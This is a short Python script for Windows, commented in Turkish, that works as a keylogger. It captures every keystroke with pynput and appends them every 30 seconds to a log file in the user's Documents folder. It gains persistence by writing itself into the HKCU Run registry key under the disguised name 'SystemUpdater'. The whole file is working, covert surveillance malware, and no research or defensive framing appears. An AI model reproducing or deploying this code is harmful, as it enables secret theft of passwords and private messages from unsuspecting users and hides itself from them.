import pynput.keyboard
import threading
import os
import sys
import getpass
import time
import winreg as reg

log_path = os.path.join(os.getenv('USERPROFILE'), 'Documents', 'logs.txt')

log = ""

def write_log():
    global log
    if log:
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(log)
        log = ""
    timer = threading.Timer(30, write_log)  # Her 30 sn'de bir logu yaz
    timer.daemon = True
    timer.start()

def on_press(key):
    global log
    try:
        if hasattr(key, 'char') and key.char is not None:
            log += key.char
        else:
            log += f' [{key}] '
    except Exception as e:
        log += f' [ERROR: {e}] '

def add_to_startup(file_path=None):
    if file_path is None:
        file_path = os.path.realpath(sys.argv[0])

    key = reg.HKEY_CURRENT_USER
    key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'

    open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(open_key, 'SystemUpdater', 0, reg.REG_SZ, file_path)
    reg.CloseKey(open_key)

def main():
    add_to_startup()
    write_log()

    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

if __name__ == "__main__":
    main()
